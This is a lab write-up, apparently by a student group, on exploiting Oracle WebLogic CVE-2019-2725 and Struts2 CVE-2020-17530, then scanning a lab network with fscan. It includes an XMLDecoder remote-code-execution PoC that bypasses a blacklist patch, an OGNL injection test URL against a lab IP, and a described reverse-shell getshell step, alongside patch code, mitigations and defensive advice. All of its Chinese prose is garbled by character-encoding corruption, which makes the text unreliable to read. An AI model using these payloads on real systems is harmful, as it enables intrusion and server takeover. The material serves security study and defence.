é€šè¿‡æˆ‘ä»¬åœ¨åœºæ™¯ä¸­çš„å¤ç°èƒ½å¤Ÿæ¸…æ¥šçœ‹åˆ°ï¼ŒWeblogic-cve-2019-2725çš„æ¼æ´æºäºåœ¨ååºåˆ—åŒ–å¤„ç†è¾“å…¥ä¿¡æ¯çš„è¿‡ç¨‹ä¸­å­˜åœ¨ç¼ºé™·ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„ HTTP è¯·æ±‚ï¼Œåˆ©ç”¨è¯¥æ¼æ´è·å–æœåŠ¡å™¨æƒé™ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æˆ‘ä»¬ä»Oracleå®˜æ–¹æ¼æ´å¤ç°æºæ‹¿åˆ°æ¼æ´é•œåƒï¼Œæ ¹æ®Oracleçš„æ¼æ´æŠ¥å‘Šï¼Œæ­¤æ¼æ´å­˜åœ¨äºå¼‚æ­¥é€šè®¯æœåŠ¡ï¼Œé€šè¿‡è®¿é—®è·¯å¾„`/_async/AsyncResponseService`ï¼Œåˆ¤æ–­ä¸å®‰å…¨ç»„ä»¶æ˜¯å¦å¼€å¯ã€‚`wls9_async_response.war`åŒ…ä¸­çš„ç±»ç”±äºä½¿ç”¨æ³¨è§£æ–¹æ³•è°ƒç”¨äº†WeblogicåŸç”Ÿå¤„ç†WebæœåŠ¡çš„ç±»ï¼Œå› æ­¤ä¼šå—è¯¥æ¼æ´å½±å“ï¼š

![Bug fixes](img/Bug%20fixes.png)

æˆ‘ä»¬ç»§ç»­åˆ†ææ¼æ´æ˜¯å¦‚ä½•å‘é€httpè¯·æ±‚ä»è€Œè·å¾—æƒé™çš„ï¼Œåœ¨`ProcessBuilder`ç±»ä¸­æ‰“ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ç›¸åº”çš„è°ƒç”¨æ ˆè¿‡ç¨‹ï¼š

![calling procedure](img/calling%20procedure.png)

æˆ‘ä»¬é€æ­¥åˆ†æï¼Œé¦–å…ˆç¨‹åºæ˜¯ç»§æ‰¿è‡ª`HttpServlet`çš„`BaseWSServlet`ç±»ï¼Œå…¶ä¸­çš„serviceæ–¹æ³•ä¸»è¦ç”¨äºå¤„ç†HTTPè¯·æ±‚åŠå…¶å“åº”ï¼Œé€šè¿‡HTTPåè®®å‘é€çš„è¯·æ±‚åŒ…å°è£…åœ¨`HttpServletRequest`ç±»çš„å®ä¾‹åŒ–å¯¹è±¡`var1`ä¸­

![underlying code logic](img/underlying%20code%20logic.png)

è°ƒç”¨`BaseWSServlet`ä¸­å®šä¹‰çš„å†…éƒ¨ç±»`AuthorizedInvoke`çš„`run()`æ–¹æ³•å®Œæˆä¼ å…¥HTTPå¯¹è±¡çš„æƒé™éªŒè¯è¿‡ç¨‹ï¼š

![AuthorizedInvoke](img/AuthorizedInvoke.png)

è‹¥æ ¡éªŒæˆåŠŸï¼Œåˆ™è¿›å…¥åˆ°`SoapProcessor`ç±»çš„processæ–¹æ³•ä¸­ï¼Œé€šè¿‡è°ƒç”¨`HttpServletRequest`ç±»å®ä¾‹åŒ–å¯¹è±¡`var1`çš„`getMethod()`æ–¹æ³•è·å–HTTPè¯·æ±‚ç±»å‹ï¼Œè‹¥ä¸ºPOSTæ–¹æ³•ï¼Œåˆ™ç»§ç»­å¤„ç†è¯·æ±‚ï¼š

![linecontent](img/linecontent.png)

HTTPè¯·æ±‚å‘é€è‡³SoapProcessorç±»çš„handlePostæ–¹æ³•ï¼š

```java
private void handlePost(BaseWSServlet var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException {
    assert var1.getPort() != null;

    WsPort var4 = var1.getPort();
    String var5 = var4.getWsdlPort().getBinding().getBindingType();
    HttpServerTransport var6 = new HttpServerTransport(var2, var3);
    WsSkel var7 = (WsSkel)var4.getEndpoint();

    try {
        Connection var8 = ConnectionFactory.instance().createServerConnection(var6, var5);
        var7.invoke(var8, var4);
    } catch (ConnectionException var9) {
        this.sendError(var3, var9, "Failed to create connection");
    } catch (Throwable var10) {
        this.sendError(var3, var10, "Unknown error");
    }
}
```

**SOAPæ˜¯ä¸€ç§é€šä¿¡åè®®**ï¼Œç”¨äºåº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚å®ƒæ˜¯ä¸€ç§è½»é‡çš„ã€ç®€å•çš„ã€åŸºäºXMLçš„åè®®ï¼Œå¯ä»¥ç‹¬ç«‹äºå¹³å°å’Œè¯­è¨€è¿›è¡Œé€šä¿¡ã€‚SOAPå®šä¹‰äº†æ•°æ®äº¤äº’ä¸­å¦‚ä½•ä¼ é€’æ¶ˆæ¯çš„è§„åˆ™ï¼Œæ¯”å¦‚åœ¨HTTPä¸­è§„å®šäº†POSTè¯·æ±‚çš„ä¼ å‚æ–¹å¼ï¼Œåœ¨æ•°æ®ç±»å‹ä¸åŒçš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ–¹å¼ã€‚

<img src="img/soap.png" alt="soap" style="zoom:50%;" />

åœ¨æ•´ä¸ªè¿›ç¨‹è°ƒç”¨ä¸­ï¼Œ`BaseWSServlet`ç±»å®ä¾‹åŒ–å¯¹è±¡`var1`å°è£…äº†åŸºäºHTTPåè®®çš„SOAPæ¶ˆæ¯ï¼š

![soapuse](img/soapuse.png)

å…¶ä¸­`WorkAreaServerHandler`ç±»ä¸­çš„`handleRequest()`æ–¹æ³•ç”¨äºå¤„ç†è®¿é—®è¯·æ±‚ï¼Œé€šè¿‡`WlMessageContext`å¯¹è±¡var2è·å–ä¼ å…¥çš„`MessageContext`ï¼Œè°ƒç”¨`var2`å¯¹è±¡çš„`getHeaders()`æ–¹æ³•è·å–ä¼ å…¥SOAPæ¶ˆæ¯çš„Headerå…ƒç´ ï¼Œå¹¶æœ€ç»ˆå°†è¯¥å…ƒç´ ä¼ é€’åˆ°`WorkAreaHeader`å¯¹è±¡`var4`ä¸­

![var4](img/var4.png)

é€šè¿‡ä¸Šè¿°æ¼æ´è°ƒç”¨è¿‡ç¨‹åˆ†æï¼Œè¦æƒ³æœ‰æ•ˆä¿®å¤æ¼æ´ï¼Œéœ€è¦å¼€å‘è¡¥ä¸,æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯åœ¨è·¯å¾„weblogic/wsee/workarea/WorkContextXmlInputAdapter.javaä¸­æ·»åŠ äº†validateæ–¹æ³•ï¼Œå³åœ¨è°ƒç”¨startElementæ–¹æ³•è§£æXMLçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè§£æåˆ°Elementå­—æ®µå€¼ä¸ºObjectå°±æŠ›å‡ºå¼‚å¸¸ï¼š

```java
private void validate(InputStream is) {
     WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

ç„¶è€Œï¼Œé‡‡ç”¨é»‘åå•çš„é˜²æŠ¤æªæ–½å¾ˆå¿«å°±è¢«POCè½»æ¾ç»•è¿‡ï¼Œå› ä¸ºå…¶ä¸­ä¸åŒ…å«ä»»ä½•Objectå…ƒç´ ã€‚å°½ç®¡ç»è¿‡XMLDecoderè§£æåï¼Œè¿™ç§æ–¹æ³•ä»ç„¶ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä¾‹å¦‚ç»™å‡ºä¸€æ®µpocï¼š

```java
<java version="1.4.0" class="java.beans.XMLDecoder">
    <new class="java.lang.ProcessBuilder">
        <string>calc</string><method name="start" />
    </new>
</java>
```

å› ä¸ºå…¶ä¸­ä¸åŒ…å«ä»»ä½•Objectå…ƒç´ ï¼Œä½†ç»`XMLDecoder`è§£æåä¾æ—§é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œ

å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†æ›´å¤šçš„å…³é”®å­—æ¼æ´åŠ å…¥åˆ°é»‘åå•ä¸­ï¼Œä»è€Œåšåˆ°å½“ç¨‹åºè§£æåˆ°å…³é”®å­—å±æ€§çš„å­—æ ·æ—¶ï¼Œå³è®¾ç½®ä¸ºå¼‚å¸¸ï¼Œobjectã€newã€methodå…³é”®å­—ç»§ç»­åŠ å…¥åˆ°é»‘åå•ä¸­ï¼Œä¸€æ—¦è§£æXMLå…ƒç´ è¿‡ç¨‹ä¸­åŒ¹é…åˆ°ä¸Šè¿°ä»»æ„ä¸€ä¸ªå…³é”®å­—å°±ç«‹å³æŠ›å‡ºè¿è¡Œæ—¶å¼‚å¸¸ã€‚ä½†æ˜¯é’ˆå¯¹voidå’Œarrayè¿™ä¸¤ä¸ªå…ƒç´ æ˜¯æœ‰é€‰æ‹©æ€§çš„æŠ›å¼‚å¸¸ï¼Œå…¶ä¸­å½“è§£æåˆ°voidå…ƒç´ åï¼Œè¿˜ä¼šè¿›ä¸€æ­¥è§£æè¯¥å…ƒç´ ä¸­çš„å±æ€§åï¼Œè‹¥æ²¡æœ‰åŒ¹é…ä¸Šindexå…³é”®å­—æ‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è€Œé’ˆå¯¹arrayå…ƒç´ è€Œè¨€ï¼Œåœ¨è§£æåˆ°è¯¥å…ƒç´ å±æ€§ååŒ¹é…classå…³é”®å­—çš„å‰æä¸‹ï¼Œè¿˜ä¼šè§£æè¯¥å±æ€§å€¼ï¼Œè‹¥æ²¡æœ‰åŒ¹é…ä¸Šbyteå…³é”®å­—ï¼Œæ‰ä¼šæŠ›å‡ºè¿è¡Œæ—¶å¼‚å¸¸ï¼š

```java
public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
              throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
       String var9 = attributes.getValue("class");
       if(var9 != null && !var9.equalsIgnoreCase("byte")) {
      throw new IllegalStateException("The value of class attribute is not valid for array element.");
     }
```

å½“ç„¶ï¼Œå¦‚æœæ”»å‡»è€…ä½¿ç”¨çš„pocä¸­å†æ¬¡çš„åˆ©ç”¨äº†voidã€arrayå’ŒClassæˆ–è€…å…¶ä»–å…ƒç´ ä¾ç„¶å¯èƒ½å¯¼è‡´ç»•è¿‡è¡¥ä¸ï¼Œå› æ­¤è¿™ç§ä¿®å¤æ¼æ´çš„æ–¹å¼åªèƒ½ä¸€å®šç¨‹åº¦ä¸Šçš„ç¼“è§£ï¼Œè€Œä¸æ˜¯ä¸€ç§å®Œå…¨å¯é çš„é˜²æŠ¤æªæ–½ã€‚

**æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œå®˜æ–¹å¯¹æ­¤æ¼æ´å‘å¸ƒäº†ç´§æ€¥çš„ä¿®å¤æ–¹å¼ï¼š**

å®˜æ–¹å·²äº4æœˆ26æ—¥å…¬å¸ƒç´§æ€¥è¡¥ä¸åŒ…ï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼šhttps://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline

ä¸»è¦é€šè¿‡ä¸¤ç§æ–¹å¼ï¼š

- **å‡çº§æœ¬åœ°JDKç‰ˆæœ¬**

  å› ä¸ºWeblogicæ‰€é‡‡ç”¨çš„æ˜¯å…¶å®‰è£…æ–‡ä»¶ä¸­é»˜è®¤1.6ç‰ˆæœ¬çš„JDKæ–‡ä»¶ï¼Œå±äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„JDKç‰ˆæœ¬ï¼Œå› æ­¤å‡çº§åˆ°JDK7u21ä»¥ä¸Šç‰ˆæœ¬å¯ä»¥é¿å…ç”±äºJavaåŸç”Ÿç±»ååºåˆ—åŒ–æ¼æ´é€ æˆçš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

- **é…ç½®URLè®¿é—®æ§åˆ¶ç­–ç•¥**

  éƒ¨ç½²äºå…¬ç½‘çš„WebLogicæœåŠ¡å™¨ï¼Œå¯é€šè¿‡ACLç¦æ­¢å¯¹/_async/*åŠ/wls-wsat/*è·¯å¾„çš„è®¿é—®ã€‚

- **åˆ é™¤ä¸å®‰å…¨æ–‡ä»¶**

  - åˆ é™¤wls9_async_response.warä¸wls-wsat.waræ–‡ä»¶åŠç›¸å…³æ–‡ä»¶å¤¹ï¼Œå¹¶é‡å¯WeblogicæœåŠ¡ã€‚å…·ä½“æ–‡ä»¶è·¯å¾„å¦‚ä¸‹ï¼š

    10.3.*ç‰ˆæœ¬ï¼š

    ```bash
    \Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
    ```

#### è‡ªåŠ¨åŒ–æ”»å‡»è„šæœ¬ç¼–å†™ï¼ˆstruts2-cve-2020-17530ï¼‰

æ ¹æ®åˆ†æï¼ŒApache Struts 2æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘Java EEç½‘ç»œåº”ç”¨ç¨‹åºçš„å¼€æºç½‘é¡µåº”ç”¨ç¨‹åºæ¶æ„ã€‚å®ƒåˆ©ç”¨å¹¶å»¶ä¼¸äº†Java Servlet APIï¼Œé¼“åŠ±å¼€å‘è€…é‡‡ç”¨MVCæ¶æ„ã€‚

å¦‚æœå¼€å‘äººå‘˜ä½¿ç”¨äº† `%{â€¦}` è¯­æ³•ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `OGNL` è¡¨è¾¾å¼ï¼Œå¼•å‘ `OGNL` è¡¨è¾¾å¼äºŒæ¬¡è§£æï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œçš„å½±å“ã€‚

å› æ­¤è¿™æ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ„é€ å¯¹åº”çš„`OGNL`çš„è¡¨è¾¾å¼è„šæœ¬æ¥å°è¯•æ”»å‡»ã€‚

åœ¨åœºæ™¯ä¸­ï¼Œé’ˆå¯¹æš´éœ²çš„ç¬¬äºŒä¸ªé¶æœºç«¯å£æˆ‘ä»¬å°è¯•è¿›è¡Œæ”»å‡»ï¼š

![status repair](img/status%20repair.png)

![The attack is back](img/The%20attack%20is%20back.png)

æ ¹æ®å‰æ–‡ä¸­æˆ‘ä»¬å·²ç»æ„é€ çš„payloadï¼š

```shell
http://192.168.1.110:8080/?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d
```

å°è¯•åœ¨ä»£ç ä¸­æ„é€ è¿™ä¸€è¡¨è¾¾å¼ï¼š

![attackshell](img/attackshell.png)

è¿è¡Œåï¼Œé€šè¿‡burpæŠ“åŒ…èƒ½å¤Ÿå¾—åˆ°ï¼š

![endingsone](img/endingsone.png)

Getshellè„šæœ¬çš„åå¼¹å‘½ä»¤éœ€è¦è¿›è¡Œè¿›è¡Œç¼–ç è½¬æ¢ï¼Œæ‰€ä»¥åå¼¹shellå¯ä»¥ä½¿ç”¨https://www.ddosi.org/shell/ åœ¨çº¿å·¥å…·å¹³å°è½¬ç ï¼š

![urlfaccode](img/urlfaccode.png)

![finish_shell](img/finish_shell.png)

å¯¹å¼€æ”¾ç«¯å£è¿è¡Œè„šæœ¬ï¼ŒæˆåŠŸgetshellï¼š

![finishshellattack](img/finishshellattack.jpg)

### æ™ºèƒ½åŒ–æ¼æ´æ‰«æå’Œæ”»å‡»å·¥å…·

#### Fscanä½¿ç”¨åˆæ¢

> ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚
> æ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ã€webæŒ‡çº¹è¯†åˆ«ã€webæ¼æ´æ‰«æã€netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚

[Githubåœ°å€](https://github.com/shadow1ng/fscan)

æˆ‘åŒæ—¶å°è¯•ä½¿ç”¨é›†æˆåŒ–çš„çš„æ¼æ´å·¥å…·å»æ¨¡æ‹Ÿæ¸—é€æ”»å‡»ï¼Œäº‹å®ä¸Šï¼Œåœ¨å®é™…çš„æ¸—é€ä¸­ï¼Œæ›´å¤šçš„æ˜¯ä½¿ç”¨è¿™ç§å¤šä¸ªåŠŸèƒ½é›†æˆå¼çš„å·¥å…·æ¥å®ç°æ¸—é€ï¼Œè¿™æ ·æ—¢èƒ½ä¿è¯æœ‰ç€è‰¯å¥½æ•ˆæœï¼ŒåŒæ—¶ä¹Ÿèƒ½æé«˜æ•ˆç‡ã€‚

Fscanä½¿ç”¨Goè¯­è¨€ç¼–å†™ï¼Œgit cloneä¸‹æ¥åï¼Œéœ€è¦ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºåä½¿ç”¨ï¼š

```go
go build -ldflags="-s -w " -trimpath main.go
```

å·¥å…·ä¸­æä¾›äº†å¤šä¸ªåŠŸèƒ½æ¨¡å—ï¼š

1.ä¿¡æ¯æœé›†:

- å­˜æ´»æ¢æµ‹(icmp)
- ç«¯å£æ‰«æ

2.çˆ†ç ´åŠŸèƒ½:

- å„ç±»æœåŠ¡çˆ†ç ´(sshã€smbã€rdpç­‰)
- æ•°æ®åº“å¯†ç çˆ†ç ´(mysqlã€mssqlã€redisã€psqlã€oracleç­‰)

3.ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ:

- netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«
- è·å–ç›®æ ‡ç½‘å¡ä¿¡æ¯
- é«˜å±æ¼æ´æ‰«æ(ms17010ç­‰)

4.Webæ¢æµ‹åŠŸèƒ½:

- webtitleæ¢æµ‹
- webæŒ‡çº¹è¯†åˆ«(å¸¸è§cmsã€oaæ¡†æ¶ç­‰)
- webæ¼æ´æ‰«æ(weblogicã€st2ç­‰,æ”¯æŒxrayçš„poc)

5.æ¼æ´åˆ©ç”¨:

- rediså†™å…¬é’¥æˆ–å†™è®¡åˆ’ä»»åŠ¡
- sshå‘½ä»¤æ‰§è¡Œ
- ms17017åˆ©ç”¨(æ¤å…¥shellcode),å¦‚æ·»åŠ ç”¨æˆ·ç­‰

6.å…¶ä»–åŠŸèƒ½:

- æ–‡ä»¶ä¿å­˜

##### å¯¹é¶æœºæ‰«æï¼š

æˆ‘ä»¬ç›´æ¥è°ƒç”¨ç›¸å…³å‚æ•°ï¼Œå³å¯å®Œæ•´è·å–åˆ°é¶æœºæ‰€æœ‰ä¿¡æ¯ï¼š

```shell
main.exe -h 192.168.56.1/24
```

![fscan_attack](img/fscan_attack.png)

åŒæ—¶ï¼Œå·¥å…·å¯ä»¥å°†è¯¥ç½‘å¡ä¸­æ‰€æœ‰ç«¯å£ä¿¡æ¯ä¿å­˜ä¸‹æ¥ï¼š

![resulttxt](img/resulttxt.png)

## ğŸ“šæ€»ç»“

é€šè¿‡æœ¬æ¬¡æ”»é˜²å®è·µå®éªŒï¼Œè®©æˆ‘ä»¬å°ç»„æˆå‘˜æ”¶è·é¢‡ä¸°ï¼Œç»è¿‡è¿™ä¸€æ®µæ—¶é—´çš„å­¦ä¹ å’Œå®è·µï¼Œæˆ‘ä»¬å¯¹äºç½‘ç»œå®‰å…¨ä¸­ç›¸å…³çš„æ”»å‡»æ–¹å¼ã€æ”»å‡»æ‰‹æ®µå’Œæµç¨‹éƒ½è¿›è¡Œäº†æ¨¡æ‹Ÿå’Œå®è·µï¼ŒåŒæ—¶ä¹Ÿå¯¹é˜²å¾¡æ–¹å¦‚ä½•å»åº”å¯¹æ”»å‡»è€…å¤šå˜å¤æ‚çš„æ”»å‡»æ‰‹æ®µï¼Œå¦‚ä½•å»æ£€æµ‹æ¶æ„è¡Œä¸ºå’Œæ¼æ´åˆ©ç”¨è¿›è¡Œäº†å®è·µæ¨¡æ‹Ÿã€‚

ä»¥æœ¬æ¬¡**è·¨ç½‘æ®µæ¸—é€**çš„æ¨¡æ‹Ÿåœºæ™¯çš„æ”»å‡»ä¸ºä¾‹ï¼Œå¯ä»¥æ¸…æ¥šçœ‹åˆ°ï¼Œåœ¨çœŸå®ç½‘ç»œç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…åœ¨è¿›è¡Œæ¸—é€æ”»å‡»å‰ä¼šè¿›è¡Œå……åˆ†çš„â€œè¯•æ¢â€œå’Œæ‘¸ç´¢ï¼š

1. **ä¿¡æ¯æ”¶é›†é˜¶æ®µ**ï¼šæ”»å‡»è€…åœ¨å¼€å§‹æ¸—é€ä¹‹å‰é¦–å…ˆè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼ŒåŒ…æ‹¬ç›®æ ‡ç½‘ç»œçš„IPåœ°å€èŒƒå›´ã€åŸŸåä¿¡æ¯ã€å­åŸŸåæšä¸¾ç­‰ã€‚å¸¸ç”¨çš„ä¿¡æ¯æ”¶é›†å·¥å…·æœ‰`Nmap`ã€`theHarvester`ç­‰ã€‚
2. **æ¼æ´æ‰«æä¸åˆ†æ**ï¼šåœ¨è·å¾—ç›®æ ‡ç½‘ç»œçš„ä¿¡æ¯åï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨æ¼æ´æ‰«æå·¥å…·æ¥å‘ç°ç›®æ ‡ç½‘ç»œä¸­å­˜åœ¨çš„æ¼æ´ï¼Œå¹¶è¿›è¡Œæ¼æ´åˆ†æï¼Œä»¥ç¡®å®šå“ªäº›æ¼æ´æ˜¯å¯ä»¥è¢«åˆ©ç”¨çš„ã€‚
3. **æ¸—é€ä¸å…¥ä¾µ**ï¼šæ”»å‡»è€…é€šè¿‡å·²å‘ç°çš„æ¼æ´æˆ–å…¶ä»–æ‰‹æ®µï¼Œå°è¯•è¿›å…¥ç›®æ ‡ç½‘ç»œã€‚æ¸—é€å·¥å…·å¦‚`Metasploit`ã€`SQLMap`ç­‰è¢«å¹¿æ³›ç”¨äºæ­¤é˜¶æ®µã€‚é‚£å¯¹äºä¸€äº›æ›´åŠ å¤æ‚çš„ç¯å¢ƒï¼Œæ”»å‡»è€…ç”šè‡³å¯èƒ½é€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µè·å–ç™»å½•å‡­è¯ï¼Œæˆ–åˆ©ç”¨è¿œç¨‹æ‰§è¡Œæ¼æ´è·å¾—å¯¹ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶æƒã€‚
4. **ææƒå’Œæƒé™ç»´æŒ**ï¼šæˆåŠŸè¿›å…¥ç›®æ ‡ç½‘ç»œåï¼Œæ”»å‡»è€…ä¼šå¯»æ±‚ææƒï¼Œä»¥è·å¾—æ›´é«˜çš„æƒé™ã€‚å¸¸ç”¨çš„å·¥å…·æœ‰`PowerSploit`ã€`mimikatz`ç­‰ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…è¿˜ä¼šå°½å¯èƒ½åœ°ç»´æŒå¯¹ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶ï¼Œä»¥ç¡®ä¿æŒä¹…æ€§åœ°ä¾µå…¥å…¥ä¾µé¶æœºï¼Œä»¥è·å¾—æ›´å¤šçš„ä¿¡æ¯ã€‚

é¢å¯¹æ”»å‡»è€…å±‚å‡ºä¸ç©·çš„â€æœºå…³å·§è®¡â€œï¼Œè“æ–¹åŒæ ·æœ‰ç€è®¸å¤šæ–¹å¼èƒ½å¤Ÿåšå‡ºæœ‰æ•ˆçš„åº”å¯¹ï¼š

1. **ç½‘ç»œé˜²æŠ¤è®¾æ–½**ï¼šè“é˜Ÿéœ€è¦å»ºç«‹å®Œå–„çš„ç½‘ç»œå®‰å…¨è®¾æ–½ï¼ŒåŒ…æ‹¬é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰ã€å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼ˆIPSï¼‰ç­‰ã€‚è¿™äº›è®¾æ–½å¯ä»¥åŠæ—¶ç›‘æµ‹å¹¶é˜»æ­¢å¯ç–‘çš„ç½‘ç»œæ´»åŠ¨å’Œæ”»å‡»è¡Œä¸ºã€‚
2. **æ¼æ´ç®¡ç†ä¸ä¿®å¤**ï¼šå®šæœŸè¿›è¡Œæ¼æ´æ‰«æï¼Œå¹¶åŠæ—¶ä¿®å¤å·²å‘ç°çš„æ¼æ´ï¼Œæ˜¯é˜²å¾¡æªæ–½ä¸­è‡³å…³é‡è¦çš„ä¸€ç¯ã€‚è“æ–¹çš„é˜²å¾¡è¿‡ç¨‹æ˜¯ä¸€ä¸ªæŒä¹…ä¸é—´æ–­çš„ï¼Œå› æ­¤ï¼Œéœ€è¦å¯¹äºç³»ç»Ÿã€ç½‘ç»œè¿›è¡ŒåŠæ—¶çš„æ‰«æå’Œç»´æŠ¤æ‰èƒ½å®æ—¶æœ‰æ•ˆåœ°é˜²å¾¡ã€‚
3. **è¡Œä¸ºåˆ†æä¸å¼‚å¸¸æ£€æµ‹**ï¼šé€šè¿‡è¡Œä¸ºåˆ†æå’Œå¼‚å¸¸æ£€æµ‹ï¼Œå¯ä»¥åŠæ—¶å¯Ÿè§‰å¼‚å¸¸çš„æ´»åŠ¨ï¼Œå¦‚å¤§é‡ä¿¡æ¯æ³¨å…¥ã€ä¸å¯»å¸¸çš„ç½‘ç»œæµé‡ã€å¤§é‡çš„ç«¯å£æ‰«æç­‰ï¼Œä»è€Œèƒ½å¤Ÿå¿«é€Ÿå®šä½åˆ°æ”»å‡»è€…çš„æ”»å‡»ç›®æ ‡å’Œæ–¹ä½ä»è€Œæœ‰æ•ˆçš„è¿›è¡Œæ£€æµ‹å’Œé˜²å¾¡ã€‚
4. **åŠ å¯†ä¸è®¿é—®æ§åˆ¶**ï¼šä½¿ç”¨å¼ºå¤§çš„åŠ å¯†æŠ€æœ¯ä¿æŠ¤æ•æ„Ÿæ•°æ®çš„ä¼ è¾“ï¼ŒåŒæ—¶åˆç†é…ç½®è®¿é—®æ§åˆ¶ï¼Œé™åˆ¶ç”¨æˆ·æƒé™ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ã€‚

æ¸—é€æ”»é˜²æ˜¯ç½‘ç»œå®‰å…¨é¢†åŸŸçš„é‡è¦æ–¹å‘ã€‚æ— è®ºæ˜¯æ”»å‡»æ–¹è¿˜æ˜¯é˜²å®ˆæ–¹ï¼Œ éƒ½éœ€è¦è¿›è¡Œå¤§é‡çš„å­¦ä¹ å’Œå°è¯•ï¼Œè¿™å°±åƒæ˜¯æ°´ç«ä¸å®¹çš„çŸ›å’Œç›¾ï¼Œåœ¨æ¿€çƒˆçš„ç¢°æ’ä¸­ï¼Œä¸æ–­åœ°äº§ç”ŸæŒ¯è‹å‘è©çš„å£°å“ã€‚

ä½œä¸ºä¸€åç½‘å®‰äººï¼Œç»ƒå°±â€ç«çœ¼é‡‘ç›â€œï¼Œç»´æŠ¤ç½‘ç»œå®‰å…¨ï¼Œæ˜¯æˆ‘ä»¬çš„è´£ä»»æ›´æ˜¯æˆ‘ä»¬çš„åˆå¿ƒã€‚

## ğŸ“’å‚è€ƒèµ„æ–™

- [å…³äºOracle WebLogic wls9-asyncç»„ä»¶å­˜åœ¨ååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„å®‰å…¨å…¬å‘Šï¼ˆç¬¬äºŒç‰ˆï¼‰](https://www.cnvd.org.cn/webinfo/show/4999)
- [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)
- [Long Term Persistence of JavaBeans Components: XML Schema](https://www.oracle.com/technical-resources/articles/java/persistence3.html)
- [2725 : Deserialization vulnerability in Oracle WebLogic Server](https://www.rapid7.com/db/vulnerabilities/oracle-weblogic-cve-2019-2725/)
- [How To Remove Docker Images, Containers, and Volumes | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes)
- [Struts2 S2-061 Remote Code Execution Vulnerability (CVE-2020-17530) Threat Alert - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/struts2-s2-061-remote-code-execution-vulnerability-cve-2020-17530-threat-alert/)
